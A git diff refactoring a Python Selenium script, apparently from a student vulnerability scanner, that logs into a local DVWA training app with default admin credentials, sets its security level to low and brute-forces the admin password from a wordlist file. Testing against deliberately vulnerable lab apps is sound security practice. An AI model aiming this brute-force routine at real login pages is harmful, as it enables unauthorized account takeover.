@@ -2,22 +2,18 @@ from selenium import webdriver
 from selenium.webdriver.support.ui import Select
 from Attack import base_attack
 
+BASE_URL = "http://localhost/DVWA/login.php"
 
-class BRUTE_FORCE(base_attack.Attack):
+class BruteForce(base_attack.Attack):
 
     def __init__(self, url):
         super().__init__(url)
 
     @staticmethod
-    def main():
+    def pass_login_page(driver, username, password):
 
-        BASE_URL = "http://localhost/DVWA/login.php"
-        username = 'admin'
-        password = 'password'
-        driver = webdriver.Chrome()
         driver.get(BASE_URL)
-        
-        ###################################PASS THE LOGIN PAGE#################################################
+
         # Find the username and password input fields on the login page using various locators
         username_field = driver.find_element('name', 'username')
         password_field = driver.find_element('name', 'password')
@@ -29,10 +25,9 @@ class BRUTE_FORCE(base_attack.Attack):
         # Find and click the login button
         login_button = driver.find_element('name', 'Login')
         login_button.click()
-        #######################################################################################################
 
-
-        ###################################CHANGE LEVEL TO LOW#################################################
+    @staticmethod
+    def change_security_level(driver):
         # After logging in, navigate to the desired page
         driver.get("http://localhost/DVWA/security.php")
 
@@ -46,24 +41,18 @@ class BRUTE_FORCE(base_attack.Attack):
 
         submit_button = driver.find_element('name', 'seclev_submit')
         submit_button.click()
-        #######################################################################################################
 
-
-        ##########################GET PASSWORDS LIST FROM FILE#################################################
-        # TODO: elad check if the below line will work
-        filename = "passwords.txt"
+    @staticmethod
+    def get_passwords_from_file(filename):
         password_list = []
         with open(filename, 'r') as file:
             for password in file:
                 # Remove leading/trailing whitespaces and newlines
                 password_list.append(password.strip())
+        return password_list
 
-
-        # TODO: Noam comment: organize the comments
-
-        #######################################################################################################
-
-        ##########################TRY TO FIND THE PASSWORD########################################################
+    @staticmethod
+    def try_passwords(driver, password_list):
         success = False
         for password in password_list:
             user = 'admin'
@@ -78,9 +67,29 @@ class BRUTE_FORCE(base_attack.Attack):
         if not success:
             print("Your website is NOT vulnerable to Brute Force attacks!")
 
-        # TODO: add recommendation for website owner about prevention the attack
+    def scan(self):
+        username = 'admin'
+        password = 'password'
+        driver = webdriver.Chrome()
 
-        #######################################################################################################
+        # Pass the login page
+        self.pass_login_page(driver, username, password)
 
-if __name__ == "__main__":
-    BRUTE_FORCE.main()
+        # Change security level
+        self.change_security_level(driver)
+
+        # Get passwords list from file
+        filename = "passwords.txt"
+        password_list = self.get_passwords_from_file(filename)
+
+        # Try to find the password
+        self.try_passwords(driver, password_list)
+
+
+def main():
+    bruteForceAttack = BruteForce(BASE_URL)
+    BruteForce.scan(bruteForceAttack)
+
+
+if __name__ == '__main__':
+    main()
